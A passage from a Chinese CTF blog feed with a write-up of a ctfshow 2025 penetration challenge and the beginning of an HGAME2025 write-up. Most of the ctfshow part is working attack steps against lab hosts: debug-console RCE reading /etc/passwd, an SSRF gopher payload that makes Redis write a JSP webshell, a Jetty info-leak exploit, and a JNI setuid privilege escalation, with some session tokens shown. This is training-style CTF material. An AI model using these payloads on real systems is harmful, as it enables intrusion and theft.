class="string">&quot;http://172.2.237.6:8888/console?__debugger__=yes&amp;cmd=print(__import__(&#x27;os&#x27;).popen(&#x27;cat%20\/etc\/passwd&#x27;).read())&amp;frm=0&amp;s=motSXRASEKviSbHLumrO&quot;</span></span><br></pre></td></tr></table></figure><p>这里不知道为什么执行不了，我就将cmd.php里的system改成eval了</p><p>重新进行rce:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.237.5/cmd.php?0=system(base64_decode(<span class="string">&#x27;Y3VybCAgLXYgLWIgICJfX3d6ZDFiYjgwMDBmZTg2YThkMzViYTkwPTE3NDA3NDc5MDF8ZjkyMTEzODg5YjQ5IiAgImh0dHA6Ly8xNzIuMi4yMzcuNjo4ODg4L2NvbnNvbGU/X19kZWJ1Z2dlcl9fPXllcyZjbWQ9cHJpbnQoX19pbXBvcnRfXygnb3MnKS5wb3BlbignY2F0JTIwXC9ldGNcL3Bhc3N3ZCcpLnJlYWQoKSkmZnJtPTAmcz1tb3RTWFJBU0VLdmlTYkhMdW1yTyI=&#x27;</span>));</span><br><span class="line"></span><br><span class="line">//curl  -v -b  <span class="string">&quot;__wzd1bb8000fe86a8d35ba90=1740747901|f92113889b49&quot;</span>  <span class="string">&quot;http://172.2.237.6:8888/console?__debugger__=yes&amp;cmd=print(__import__(&#x27;os&#x27;).popen(&#x27;cat%20\/etc\/passwd&#x27;).read())&amp;frm=0&amp;s=motSXRASEKviSbHLumrO&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250228-222730.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class="line">_apt:x:42:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">ctfer:x:1000:1000::/home/ctfer:/bin/bash</span><br></pre></td></tr></table></figure><p>也可以进行外带注入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.237.5/cmd.php?0=system(base64_decode(<span class="string">&#x27;Y3VybCAgLXYgLWIgICJfX3d6ZDFiYjgwMDBmZTg2YThkMzViYTkwPTE3NDA3NDc5MDF8ZjkyMTEzODg5YjQ5IiAgImh0dHA6Ly8xNzIuMi4yMzcuNjo4ODg4L2NvbnNvbGU/X19kZWJ1Z2dlcl9fPXllcyZjbWQ9X19pbXBvcnRfXygnb3MnKS5wb3BlbignY2F0JTIwXC9ldGNcL3Bhc3N3ZD4uXC9sb2dcL21haW4ubG9nJykmZnJtPTAmcz1tb3RTWFJBU0VLdmlTYkhMdW1yTyI=&#x27;</span>));</span><br><span class="line"></span><br><span class="line">//curl  -v -b  <span class="string">&quot;__wzd1bb8000fe86a8d35ba90=1740747901|f92113889b49&quot;</span>  <span class="string">&quot;http://172.2.237.6:8888/console?__debugger__=yes&amp;cmd=__import__(&#x27;os&#x27;).popen(&#x27;cat%20\/etc\/passwd&gt;.\/log\/main.log&#x27;)&amp;frm=0&amp;s=motSXRASEKviSbHLumrO&quot;</span></span><br></pre></td></tr></table></figure><p>再访问main.log即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.237.5/cmd.php?0=system(base64_decode(<span class="string">&#x27;Y3VybCAtdiAtYiAic2Vzc2lvbj1leUoxYzJWeUlqb2lZV1J0YVc0aWZRLlo4R1pQdy5vZ2hpOUJ4NXRZMl85d2l6MDJlSjlSVWR4UDQiICAiaHR0cDovLzE3Mi4yLjIzNy42Ojg4ODgvZ2V0X2xvZ19jb250ZW50P2xvZ0ZpbGU9bWFpbi5sb2ci&#x27;</span>));</span><br><span class="line"></span><br><span class="line">//curl -v -b <span class="string">&quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z8GZPw.oghi9Bx5tY2_9wiz02eJ9RUdxP4&quot;</span>  <span class="string">&quot;http://172.2.237.6:8888/get_log_content?logFile=main.log&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250228-223635.png"></p><p>也可以用大佬写的interactive shell脚本，内容根据情况修改：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    <span class="comment"># data = urllib.parse.quote(data)</span></span><br><span class="line">    <span class="comment"># python_shell = &#x27;curl --cookie &quot;session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3kddg.CjbNhdNFa_7H--igibxBzM2omNk;__wzd2fb5743f98b45463400e=1736152460|4bfc86e353c8&quot; &quot;http://172.2.252.6:8888/console?__debugger__=yes&amp;s=eABh7cMeNgMKri1DSi4w&amp;cmd=&#123;&#125;&amp;frm=1&quot;&#x27;.format(data)</span></span><br><span class="line">    <span class="comment"># python_shell = base64.b64encode(python_shell.encode()).decode()</span></span><br><span class="line">    data = base64.b64encode(data.encode()).decode()</span><br><span class="line">    <span class="comment"># normal_shell = &#x27;echo &quot;&#x27; + data + &#x27;&quot; | base64 -d | sh&#x27;</span></span><br><span class="line">    normal_shell=data</span><br><span class="line">    <span class="comment"># url = &quot;https://543f943e-6f90-43b4-bfc8-ee86d2fb3f34.challenge.ctf.show/downloadTaskFile?url=http://172.2.239.5/1.php?1=phpinfo();&quot;</span></span><br><span class="line">    url = <span class="string">&quot;http://9c30a725-a36d-4e54-874b-f088dc3d80cf.challenge.ctf.show/downloadTaskFile?url=http://172.2.233.5/1.php?1=system(base64_decode(\&quot;&quot;</span>+normal_shell+<span class="string">&quot;\&quot;));&quot;</span></span><br><span class="line">    response = requests.get(url, verify=<span class="literal">False</span>, headers=&#123;<span class="string">&#x27;Authorization&#x27;</span>: <span class="string">&quot;Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkeWxhbiIsImV4cCI6MTgzNjIzMjMxN30.nB-6uWH-wBxU3e_QJLw1O_TaPARU5o2DUe-y1TvqX5w&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># print(url)</span></span><br><span class="line">        <span class="comment"># print(response.json())</span></span><br><span class="line">        <span class="comment"># print(response.json()[&quot;url&quot;])</span></span><br><span class="line">        <span class="built_in">print</span>(response.json()[<span class="string">&quot;file_content&quot;</span>])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error&quot;</span>)</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p><code>flag10：ctfshow&#123;ctfer:x:1000:1000::/home/ctfer:/bin/bash&#125;</code></p><h3 id="第五章"><a href="#第五章" class="headerlink" title="第五章"></a>第五章</h3><h4 id="艰难的最后一步"><a href="#艰难的最后一步" class="headerlink" title="艰难的最后一步"></a>艰难的最后一步</h4><p>需要<strong>提交redis的密码</strong></p><p>这里继续横向渗透，发现7的8080端口存在jetty服务，Eclipse Jetty是一个Java Web 服务器和Java Servlet容器。</p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250301-144914.png"></p><p>看了下服务器版本为<code>Jetty(9.4.40.v20210413)</code>，直接搜：<a href="https://xz.aliyun.com/news/11267?u_atoken=5cf7bf3f92f98efc3c5a4e7ef58dac09&u_asig=0a47315217408114017564414e00c9/eb699">jetty常用渗透总结</a></p><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250301-145338.png"></p><p>发现存在信息泄露，<strong>CVE-2021-34429</strong>直接打</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.139.7:8080/.%00/WEB-INF/web.xml</span><br></pre></td></tr></table></figure><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250301-145629.png"></p><p>port为6380</p><p><code>flag11：ctfshow&#123;ctfshow_2025&#125;</code></p><h4 id="功亏一篑"><a href="#功亏一篑" class="headerlink" title="功亏一篑"></a>功亏一篑</h4><p>需要<strong>提交 &#x2F;dylan.txt 中的key</strong></p><p><code>/dylan.txt</code>在根目录里，而前面我们拿到了redis密码，这里自然要登陆redis</p><p>登录redis：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.139.5/cmd.php?0=system(base64_decode(<span class="string">&#x27;Y3VybCAgLXYgICJkaWN0Oi8vMTcyLjIuMTM5Ljc6NjM4MC9hdXRoOmN0ZnNob3dfMjAyNSI=&#x27;</span>));</span><br><span class="line"></span><br><span class="line">//curl  -v  <span class="string">&quot;dict://172.2.139.7:6380/auth:ctfshow_2025&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250301-152329.png"></p><p>构造gopher请求写jsp马：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">auth ctfshow_2025</span><br><span class="line">set mars &quot;&lt;% Runtime.getRuntime().exec(new String[]&#123;\&quot;sh\&quot;,\&quot;-c\&quot;,request.getParameter(\&quot;cmd\&quot;)&#125;);%&gt;&quot;</span><br><span class="line">config set dir /opt/jetty/webapps/ROOT/</span><br><span class="line">config set dbfilename 2.jsp</span><br><span class="line">save</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><p>url编码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://172.2.139.7:6380/_auth%20ctfshow_2025%0Aset%20mars%20%22%3C%25%20Runtime.getRuntime().exec(new%20String%5B%5D%7B%5C%22sh%5C%22%2C%5C%22-c%5C%22%2Crequest.getParameter(%5C%22cmd%5C%22)%7D)%3B%25%3E%22%0Aconfig%20set%20dir%20%2Fopt%2Fjetty%2Fwebapps%2FROOT%2F%0Aconfig%20set%20dbfilename%202.jsp%0Asave%0Aquit</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.139.5/cmd.php?0=system(base64_decode(<span class="string">&#x27;Y3VybCAgLXYgICJnb3BoZXI6Ly8xNzIuMi4xMzkuNzo2MzgwL19hdXRoJTIwY3Rmc2hvd18yMDI1JTBBc2V0JTIwbWFycyUyMCUyMiUzQyUyNSUyMFJ1bnRpbWUuZ2V0UnVudGltZSgpLmV4ZWMobmV3JTIwU3RyaW5nJTVCJTVEJTdCJTVDJTIyc2glNUMlMjIlMkMlNUMlMjItYyU1QyUyMiUyQ3JlcXVlc3QuZ2V0UGFyYW1ldGVyKCU1QyUyMmNtZCU1QyUyMiklN0QpJTNCJTI1JTNFJTIyJTBBY29uZmlnJTIwc2V0JTIwZGlyJTIwJTJGb3B0JTJGamV0dHklMkZ3ZWJhcHBzJTJGUk9PVCUyRiUwQWNvbmZpZyUyMHNldCUyMGRiZmlsZW5hbWUlMjAyLmpzcCUwQXNhdmUlMEFxdWl0Ig==&#x27;</span>));</span><br><span class="line"></span><br><span class="line">//curl  -v  <span class="string">&quot;gopher://172.2.139.7:6380/_auth%20ctfshow_2025%0Aset%20mars%20%22%3C%25%20Runtime.getRuntime().exec(new%20String%5B%5D%7B%5C%22sh%5C%22%2C%5C%22-c%5C%22%2Crequest.getParameter(%5C%22cmd%5C%22)%7D)%3B%25%3E%22%0Aconfig%20set%20dir%20%2Fopt%2Fjetty%2Fwebapps%2FROOT%2F%0Aconfig%20set%20dbfilename%202.jsp%0Asave%0Aquit&quot;</span></span><br></pre></td></tr></table></figure><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250301-154409.png"></p><p>由于没有回显，所以需要带到其他文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.139.7:8080/2.jsp?cmd=ls%20/&gt;/opt/jetty/webapps/ROOT/1.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.139.7:8080/1.txt</span><br></pre></td></tr></table></figure><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250301-155853.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.139.7:8080/2.jsp?cmd=cat%20/dylan.txt&gt;/opt/jetty/webapps/ROOT/1.txt</span><br></pre></td></tr></table></figure><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250301-160000.png"></p><p><code>flag12：ctfshow&#123;7b11a7ae330883cb5bf667a9c1604635&#125;</code></p><h4 id="今日方知我是我"><a href="#今日方知我是我" class="headerlink" title="今日方知我是我"></a>今日方知我是我</h4><p>需要<strong>提交&#x2F;root&#x2F;message.txt中提到的网址</strong></p><p>需要提权</p><p>查suid:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250301-161120.png"></p><p>没有可以利用的</p><p>查cap权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.139.7:8080/2.jsp?cmd=getcap%20-r%20/%202&gt;/dev/null&gt;/opt/jetty/webapps/ROOT/1.txt</span><br></pre></td></tr></table></figure><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250301-161358.png"></p><p>发现java有setuid权限</p><p>不会Java提权，只能参考官方wp的做法：</p><p>写入SetUID.c：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">JNIEXPORT jint JNICALL <span class="title function_">Java_SetUID_setUID</span><span class="params">(JNIEnv *env, jobject obj, jint uid)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> setuid(uid);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.139.7:8080/2.jsp?cmd=<span class="built_in">echo</span>%20<span class="string">&quot;I2luY2x1ZGUgPGpuaS5oPgovLzExMTExMTExMTExMjIKI2luY2x1ZGUgPHVuaXN0ZC5oPgoKSk5JRVhQT1JUIGppbnQgSk5JQ0FMTCBKYXZhX1NldFVJRF9zZXRVSUQoSk5JRW52ICplbnYsIGpvYmplY3Qgb2JqLCBqaW50IHVpZCkgewogICAgcmV0dXJuIHNldHVpZCh1aWQpOwp9&quot;</span>%20|<span class="built_in">base64</span>%20-d%20&gt;/opt/jetty/webapps/ROOT/SetUID.c</span><br></pre></td></tr></table></figure><p>写入SetUID.java:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SetUID</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;SetUID&quot;</span>); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">setUID</span><span class="params">(<span class="type">int</span> uid)</span>; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">SetUID</span> <span class="variable">setUID</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SetUID</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> setUID.setUID(<span class="number">0</span>); </span><br><span class="line">        Runtime.getRuntime.exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;cat /root/*.txt&gt;/opt/jetty/webapps/ROOT/root.txt&quot;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.139.7:8080/2.jsp?cmd=<span class="built_in">echo</span>%20<span class="string">&quot;cHVibGljIGNsYXNzIFNldFVJRCB7CiAgICBzdGF0aWMgewogICAgICAgIFN5c3RlbS5sb2FkTGlicmFyeSgiU2V0VUlEIik7IAogICAgfQoKICAgIHB1YmxpYyBuYXRpdmUgaW50IHNldFVJRChpbnQgdWlkKTsgCiAgLy9hCiAgICBwdWJsaWMgc3RhdGljIHZvaWQgbWFpbihTdHJpbmdbXSBhcmdzKSB0aHJvd3MgRXhjZXB0aW9uIHsKICAgICAgICBTZXRVSUQgc2V0VUlEID0gbmV3IFNldFVJRCgpOwogICAgICAgIGludCByZXN1bHQgPSBzZXRVSUQuc2V0VUlEKDApOyAKICAgICAgICBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKG5ldyBTdHJpbmdbXXsic2giLCItYyIsImNhdCAvcm9vdC8qLnR4dD4vb3B0L2pldHR5L3dlYmFwcHMvUk9PVC9yb290LnR4dCJ9KTsKICAgIH0KfQ==&quot;</span>%20|<span class="built_in">base64</span>%20-d%20&gt;/opt/jetty/webapps/ROOT/SetUID.java</span><br></pre></td></tr></table></figure><p>编译SetUID.c:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.139.7:8080/2.jsp?cmd=gcc%20-shared%20-fPIC%20-o%20/opt/jetty/webapps/ROOT/libSetUID.so%20-I$&#123;JAVA_HOME&#125;/include%20-I$&#123;JAVA_HOME&#125;/include/linux%20/opt/jetty/webapps/ROOT/SetUID.c</span><br></pre></td></tr></table></figure><p>编译SetUID.java：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.139.7:8080/2.jsp?cmd=javac%20/opt/jetty/webapps/ROOT/SetUID.java</span><br></pre></td></tr></table></figure><p>root执行命令:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.2.139.7:8080/2.jsp?cmd=java%20-Djava.library.path=/opt/jetty/webapps/ROOT/%20-cp%20/opt/jetty/webapps/ROOT/%20SetUID</span><br></pre></td></tr></table></figure><p><img src="/2025/03/01/ctfshow-2025%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B%E5%A4%8D%E7%8E%B0/QQ20250301-164814.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">致信后来者：</span><br><span class="line"></span><br><span class="line">同志你好！我是81192，我不是第一批81192，也不会是最后一批81192，81192从来不是一个人。</span><br><span class="line">现在，同志，你也是81192的一员了。</span><br><span class="line"></span><br><span class="line">我已经清理和收集了他们的所有资料并传回总部，但是在我离开的时候，被dylan投毒，我已经感染了他们的朊病毒。</span><br><span class="line">我把我的最后的话，都放到了一个网址里面，你在他们的任务中心中，用dylan身份登陆后，在管理菜单中 访问下面地址，就能看到了！再见了，同志！</span><br><span class="line">网址是：http://8.11.9.2</span><br><span class="line"></span><br><span class="line">现在我命令你：</span><br><span class="line">我已无法返航，请继续前进！请继续前进！</span><br><span class="line"></span><br><span class="line">（完）</span><br></pre></td></tr></table></figure><p><code>flag13：ctfshow&#123;http://8.11.9.2&#125;</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> wp </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HGAME2025 week1</title>
      <link href="/2025/02/23/HGAME2025-week1/"/>
      <url>/2025/02/23/HGAME2025-week1/</url>
      
        <content type="html"><![CDATA[<h2 id="Pacman"><a href="#Pacman" class="headerlink" title="Pacman"></a>Pacman</h2><p>js前端题，发现两个可疑的gift：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aGFldTRlcGNhXzR0cmdte19yX2Ftbm1zZX0=</span><br><span class="line">aGFlcGFpZW1rc3ByZXRnbXtydGNfYWVfZWZjfQ==</span><br></pre></td></tr></table></figure><p>分别base64解码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">haeu4epca_4trgm&#123;_r_amnmse&#125;</span><br><span class="line">haepaiemkspretgm&#123;rtc_ae_efc&#125;</span><br></pre></td></tr></table></figure><p>随波逐流直接梭，是个栅栏加密：</p><p><img src="/2025/02/23/HGAME2025-week1/QQ20250206-171247.png"></p><p><img src="/2025/02/23/HGAME2025-week1/QQ20250206-171412.png"></p><p>第一个为真flag</p><h2 id="BandBomb"><a href="#BandBomb" class="headerlink" title="BandBomb"></a>BandBomb</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">&#x27;multer&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/static&#x27;</span>, express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>)));</span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>());</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> storage = multer.<span class="title function_">diskStorage</span>(&#123;</span><br><span class="line">  <span class="attr">destination</span>: <span class="function">(<span class="params">req, file, cb</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> uploadDir = <span class="string">&#x27;uploads&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!fs.<span class="title function_">existsSync</span>(uploadDir)) &#123;</span><br><span 